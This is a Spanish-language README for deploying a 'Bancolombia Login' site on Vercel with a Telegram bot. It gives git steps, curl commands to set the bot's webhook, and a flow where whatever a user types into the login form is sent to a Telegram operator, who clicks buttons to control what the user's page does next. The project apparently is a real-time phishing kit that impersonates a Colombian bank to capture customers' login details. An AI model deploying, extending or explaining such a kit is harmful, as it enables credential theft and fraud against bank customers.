# Bancolombia Login - Vercel Deployment

## 📋 Requisitos

1. Cuenta en GitHub
2. Cuenta en Vercel
3. Bot de Telegram configurado

## 🚀 Pasos para desplegar

### 1. Crear repositorio en GitHub

```bash
git init
git add .
git commit -m "Initial commit"
git branch -M main
git remote add origin https://github.com/TU_USUARIO/TU_REPO.git
git push -u origin main
```

### 2. Conectar a Vercel

1. Ve a [vercel.com](https://vercel.com)
2. Haz click en "New Project"
3. Selecciona tu repositorio de GitHub
4. Click en "Import"
5. Click en "Deploy"

### 3. Configurar Webhook de Telegram

Una vez desplegado, debes decirle a tu bot de Telegram que envíe los updates a Vercel:

```bash
curl -X POST https://api.telegram.org/bot{TU_BOT_TOKEN}/setWebhook \
  -H "Content-Type: application/json" \
  -d '{"url": "https://TU_VERCEL_URL.vercel.app/api/telegram-webhook"}'
```

Reemplaza:
- `{TU_BOT_TOKEN}`: Tu token del bot
- `TU_VERCEL_URL`: La URL que Vercel te asigna

### 4. Verificar webhook

```bash
curl https://api.telegram.org/bot{TU_BOT_TOKEN}/getWebhookInfo
```

## 📝 Estructura del proyecto

```
├── index.html                    # Frontend (formulario)
├── package.json                  # Dependencias
├── vercel.json                   # Configuración Vercel
├── api/
│   ├── telegram-webhook.js       # Recibe callbacks de botones
│   └── telegram-response.js      # Almacena/devuelve respuestas
└── .gitignore
```

## 🔧 Variables de entorno

En Vercel, las variables se configuran en:
- Project Settings → Environment Variables

No es necesario configurar nada por ahora, pero si lo necesitas después:

```env
TELEGRAM_BOT_TOKEN=tu_token_aqui
```

## 🎯 Cómo funciona el flujo

1. Usuario rellena el formulario en `index.html`
2. Se envía a Telegram con botones de respuesta
3. Admin hace click en un botón
4. Telegram envía callback a `/api/telegram-webhook`
5. El webhook guarda la respuesta en `/api/telegram-response`
6. El formulario consulta periódicamente la respuesta
7. Si hay respuesta, ejecuta la acción correspondiente

## ⚠️ Notas importantes

- Las respuestas se guardan en memoria y se pierden si Vercel reinicia
- Para persistencia real, necesitarías una base de datos (MongoDB, Supabase, etc)
- El webhook debe ser público y accesible desde internet

## 🐛 Troubleshooting

**Error: "Function Runtimes must have a valid version"**
- Asegúrate de que `vercel.json` está correctamente configurado
- No uses sintaxis de `runtime` antigua

**Webhook no recibe updates**
```bash
# Verifica que el webhook está registrado
curl https://api.telegram.org/bot{TU_BOT_TOKEN}/getWebhookInfo

# Si no funciona, reinicia el webhook
curl -X POST https://api.telegram.org/bot{TU_BOT_TOKEN}/setWebhook \
  -H "Content-Type: application/json" \
  -d '{"url": "https://TU_VERCEL_URL.vercel.app/api/telegram-webhook"}'
```

**Las respuestas se pierden**
- Esto es normal con almacenamiento en memoria
- Considera usar una base de datos como alternativa

## 📞 Soporte

Si tienes problemas, verifica los logs en:
- Vercel Dashboard → Deployments → View Logs
- Telegram Bot API documentation
